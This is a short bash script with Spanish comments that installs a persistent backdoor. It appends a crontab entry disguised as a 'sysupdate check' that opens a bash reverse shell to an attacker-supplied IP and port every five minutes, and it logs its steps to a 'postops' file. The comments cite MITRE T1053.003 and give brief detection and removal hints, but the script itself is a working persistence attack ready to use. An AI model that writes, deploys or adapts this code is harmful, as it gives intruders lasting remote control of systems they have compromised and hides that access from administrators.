#!/bin/bash

# Añade cron job para reverse shell periódica. Camuflado como "sysupdate".
# Funciona: Ejecuta cada 5 min un bash reverse a atacante.
# Persistencia: Sobrevive reboots via crontab.
# Detección: crontab -l, /var/log/cron. Eliminar: Editar crontab -e.
# MITRE: T1053.003.

ATTACKER_IP=${1:-192.168.1.50}
PORT=${2:-4444}

CRON_JOB="*/5 * * * * /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1 # sysupdate check"

if crontab -l | grep -q "sysupdate check"; then
    echo "[+] Cron ya existe. Saltando." | tee -a /var/log/postops.log
    exit 0
fi

echo "[+] Añadiendo cron persistente camuflado" | tee -a /var/log/postops.log

(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab - || { echo "Error en crontab"; exit 1; }

echo "[+] Cron añadido" | tee -a /var/log/postops.log
